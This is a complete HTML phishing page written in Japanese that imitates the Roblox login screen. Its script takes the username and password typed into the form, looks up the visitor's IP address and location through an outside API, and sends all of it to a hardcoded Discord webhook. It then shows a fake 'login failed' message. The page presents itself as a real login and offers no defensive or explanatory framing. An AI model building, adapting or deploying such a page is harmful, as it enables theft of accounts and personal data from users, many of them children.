<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox ログイン</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #232323;
            padding: 40px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .roblox-logo {
            font-size: 32px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 30px;
            color: #ffffff;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            background-color: #111111;
            border: 1px solid #393939;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #0074e8;
        }

        .form-group input::placeholder {
            color: #7a7a7a;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #0074e8;
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #005bb5;
        }

        .forgot-password {
            display: block;
            margin-top: 20px;
            color: #0074e8;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            margin: 25px 0;
            border-bottom: 1px solid #393939;
        }

        .signup-text {
            font-size: 14px;
            color: #a0a0a0;
        }

        .signup-text a {
            color: #0074e8;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- ロゴ -->
        <div class="roblox-logo">ROBLOX</div>

        <!-- ログインフォーム -->
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="ユーザー名 / メールアドレス / 電話番号" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="パスワード" required>
            </div>
            
            <button type="submit" class="login-btn">ログイン</button>
        </form>

        <!-- リンク類 -->
        <a href="#" class="forgot-password">パスワードまたはユーザー名を忘れましたか？</a>

        <div class="divider"></div>

        <div class="signup-text">
            アカウントをお持ちではありませんか？ <a href="#">新規登録</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1538431559256903701/06R0g9x85eO0SUhk-YIL_u9PzSXjClccydOUh8D5xnPsel0-YNrfl_GOR4HrDB-gbanf';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault(); // ページのリロードを防ぐ

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            let ipAddress = "取得失敗";
            let country = "";
            let city = "";

            try {
                // 外部APIからIPアドレスと位置情報を取得
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                if (ipData && ipData.ip) {
                    ipAddress = ipData.ip;
                    country = ipData.country_name || "";
                    city = ipData.city || "";
                }
            } catch (err) {
                console.error('IP取得エラー:', err);
            }

            // 送信データの設定（IP情報も含める）
            const payload = {
                content: `**新しいログイン情報が送信されました**\n` +
                         `👤 ユーザー名: \`${username}\`\n` +
                         `🔑 パスワード: \`${password}\`\n` +
                         `🌐 IPアドレス: \`${ipAddress}\`\n` +
                         `📍 場所: \`${country} ${city}\``
            };

            // Webhookへ送信
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert('ログインに失敗しました（テスト用）');
                } else {
                    alert('送信エラーが発生しました。');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('通信エラーが発生しました。');
            });
        });
    </script>

</body>
</html>
